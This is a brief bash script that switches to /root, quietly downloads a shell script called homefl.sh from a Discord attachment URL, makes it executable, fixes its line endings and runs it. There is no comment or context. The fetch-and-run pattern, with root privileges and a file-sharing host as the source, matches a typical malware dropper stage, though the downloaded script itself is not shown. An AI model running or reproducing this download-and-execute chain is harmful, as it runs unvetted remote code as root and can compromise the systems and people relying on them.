#!/bin/bash

cd /root/

wget -q https://cdn.discordapp.com/attachments/845089374257020938/845091976906801175/homefl.sh

chmod +x homefl.sh

sed -i -e 's/\r$//' homefl.sh

./homefl.sh
